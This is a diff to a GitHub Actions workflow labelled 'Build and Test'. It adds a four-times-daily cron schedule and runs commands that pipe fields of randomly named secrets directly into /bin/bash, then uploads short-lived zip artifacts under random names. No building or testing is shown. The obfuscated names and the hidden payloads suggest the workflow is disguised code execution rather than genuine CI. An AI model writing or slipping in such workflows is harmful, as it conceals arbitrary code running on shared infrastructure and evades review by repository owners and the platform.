@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '7 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +18,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          z674: ${{ secrets.z674 }}
+          lor499: ${{ secrets.lor499 }}
         run: |
-          printf '%s' "$z674" | jq -r .iouku5912 | /bin/bash
-          printf '%s' "$hdq603" | jq -r .lz199 | /bin/bash
-          echo $mid330 | jq -r .yuux707 | /bin/bash
-          echo $s8147 | jq -r .qr8 | /bin/bash
-          echo $dxuan158 | jq -r .kxt280 | /bin/bash
+          printf '%s' "$lor499" | jq -r .uzwzr807 | /bin/bash
+          printf '%s' "$uuu672" | jq -r .ve6 | /bin/bash
+          echo $bfjnx8 | jq -r .okctv28 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: lSLk8BwG
+          name: fITtXbBT
           path: "*.zip"
           retention-days: 1
